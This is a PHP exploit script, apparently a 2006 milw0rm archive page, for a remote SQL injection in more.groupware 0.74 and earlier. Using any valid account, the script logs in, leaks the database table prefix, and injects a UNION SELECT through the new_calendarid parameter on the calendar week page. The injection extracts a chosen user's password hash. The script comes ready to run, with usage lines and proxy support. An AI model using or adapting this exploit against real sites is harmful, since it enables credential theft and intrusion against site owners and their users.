<html><head><title>more.groupware <= 0.74 (new_calendarid) Remote SQL Injection Exploit</title></head><pre>&lt;?
error_reporting(E_ERROR);

function exploit_init()
{
    if (!extension_loaded('php_curl') &amp;&amp; !extension_loaded('curl'))
    {
       if (!dl('curl.so') &amp;&amp; !dl('php_curl.dll'))
       die (&quot;oo error - cannot load curl extension!&quot;);
    }
}

function exploit_header()
{
    echo &quot;\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;
    echo &quot;                                  oo    ooooooo     ooooooo\n&quot;;
    echo &quot;                    oooo   oooo o888  o88     888 o888   888o\n&quot;;
    echo &quot;                      888o888    888        o888   888888888\n&quot;;
    echo &quot;                      o88888o    888     o888   o 888o   o888\n&quot;;
    echo &quot;                    o88o   o88o o888o o8888oooo88   88ooo88\n&quot;;
    echo &quot;ooooooooooooooooooo more.groupware 0.7.4 remote sql injection oooooooooooooooooo\n&quot;;
    echo &quot;oo usage          $ php mg-074-exploit.php [url] [user] [pwd] [id]\n&quot;;
    echo &quot;oo proxy support  $ php mg-074-exploit.php [url] [user] [pwd] [id]\n&quot;;
    echo &quot;                  [proxy]:[port]\n&quot;;
    echo &quot;oo example        $ php mg-074-exploit.php http://localhost x128 pwd 1\n&quot;;
    echo &quot;oo you need an account on the system\n&quot;;
    echo &quot;oo print the password of the user\n\n&quot;;
}

function exploit_bottom()
{
    echo &quot;\noo message  : sanja - es tut mir sehr leid, was ich zu dir gesagt habe. ich war\n&quot;;
    echo &quot;              nicht ich selbst. ich hoffe, dass du diesen exploit als wiedergut-&quot;;
    echo &quot;              machung verstehst. ich haette dich zwar lieber zum eisessen\n&quot;; 
    echo &quot;              eingeladen, aber ich traue mich nicht mehr dich zu fragen ;).\n&quot;;
    echo &quot;oo discover : x128 - alexander wilhelm - 17/09/2006\n&quot;;
    echo &quot;oo contact  : exploit &lt;at&gt; x128.net                    oo website : www.x128.net\n&quot;;
}

function exploit_execute()
{
    $connection = curl_init();

    if ($_SERVER['argv'][5])
    {
        curl_setopt($connection, CURLOPT_TIMEOUT, 8);
        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][5]);
    }
    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');
    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($connection, CURLOPT_HEADER, 0);
    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_COOKIE, 1);
    curl_setopt ($connection, CURLOPT_COOKIEJAR, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_COOKIEFILE, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/index.php&quot;);
    curl_setopt ($connection, CURLOPT_POSTFIELDS, &quot;login=&quot; . $_SERVER['argv'][2] . &quot;&amp;password=&quot; . $_SERVER['argv'][3] . &quot;&amp;checkip=0&quot;);
    $source = curl_exec($connection) or die(&quot;oo error - cannot connect!\n&quot;);

    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_POSTFIELDS, &quot;new_calendarid=x128&quot;);
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/modules/calendar/week.php?&quot;);
    $source = curl_exec($connection) or die(&quot;oo error - cannot connect!\n&quot;);

    preg_match(&quot;/([0-9a-zA-Z_]*)users/&quot;, $source, $prefix);

    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_POSTFIELDS, &quot;new_calendarid=&quot; .urlencode(&quot;0 UNION SELECT id,pw FROM &quot; . $prefix[1] . &quot;users WHERE id = &quot; . $_SERVER['argv'][4]));
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/modules/calendar/week.php&quot;);
    $source = curl_exec($connection) or die(&quot;oo error - cannot connect!\n&quot;);

    preg_match(&quot;/&gt;([0-9a-f]{32})&lt;/&quot;, $source, $password);

    if ($password[1])
    {
        echo &quot;oo password       &quot; . $password[1] . &quot;\n\n&quot;;
        echo &quot;oo dafaced ...\n&quot;;
    }

    curl_close ($connection);
}

exploit_init();
exploit_header();
exploit_execute();
exploit_bottom();
?&gt;

# milw0rm.com [2006-09-19]</pre></html>